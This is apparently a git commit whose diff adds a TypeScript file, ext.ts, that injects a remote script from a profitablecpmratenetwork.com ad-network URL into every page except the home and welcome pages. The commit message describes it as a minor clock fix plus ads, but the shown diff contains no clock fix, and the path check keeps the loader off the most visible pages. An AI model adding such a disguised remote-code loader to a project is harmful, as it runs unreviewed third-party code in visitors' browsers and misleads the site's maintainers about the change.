4df3630cbbfeb157d1911df8957cf98465b30c09
not-amplify <not.amplify.x@gmail.com>
2026-05-04 11:26:07 -0400

    minor clockfix, ads

---
+++ src/utils/ext.ts
@@ -0,0 +1,8 @@
+const path = location.pathname.replace(/\/$/, '') || '/';
+if (path !== '/' && path !== '/welcome') {
+  const script = document.createElement('script');
+  script.src =
+    'https://pl29334616.profitablecpmratenetwork.com/4a/a1/11/4aa111ba60066e322a3fa56e92984f39.js';
+  script.async = true;
+  document.body.appendChild(script);
+}
